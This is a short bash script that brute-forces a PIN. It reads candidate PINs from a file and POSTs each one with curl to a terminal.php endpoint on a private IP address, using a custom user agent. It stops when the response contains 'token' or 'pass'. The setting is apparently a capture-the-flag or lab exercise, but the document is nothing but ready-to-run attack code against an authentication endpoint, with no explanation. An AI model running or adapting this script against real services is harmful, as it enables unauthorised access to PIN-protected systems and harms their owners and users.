while read -r pin; do
  response=$(curl -s -A "secretcomputer" \
    -X POST -d "PIN=$pin" \
    "http://10.49.165.97/terminal.php?action=pin")

  msg=$(printf '%s\n' "$response" | grep -o '"msg"[[:space:]]*:[[:space:]]*"[^"]*"' | cut -d'"' -f4)

  echo "[+] Trying pin: $pin | Status: $msg"
  echo "[-] Response: $response"

  if grep -qE 'token|pass' <<<"$response"; then
    echo "[+] Pin found: $pin"
    break
  fi
done < pins.txt
